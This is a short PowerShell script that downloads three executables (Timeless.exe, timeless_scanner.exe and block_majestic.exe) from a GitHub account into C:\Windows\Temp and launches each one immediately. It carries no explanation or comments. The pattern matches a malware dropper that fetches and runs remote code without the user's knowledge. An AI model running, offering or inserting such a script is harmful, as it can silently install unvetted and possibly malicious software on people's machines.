(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/newe/raw/refs/heads/main/Timeless.exe','C:\Windows\Temp\Timeless.exe')
Start-Process 'C:\Windows\Temp\Timeless.exe'
(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/command/raw/refs/heads/main/timeless_scanner.exe','C:\Windows\Temp\timeless_scanner.exe')
Start-Process 'C:\Windows\Temp\timeless_scanner.exe'
(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/command/raw/refs/heads/main/block_majestic.exe','C:\Windows\Temp\block_majestic.exe')
Start-Process 'C:\Windows\Temp\block_majestic.exe'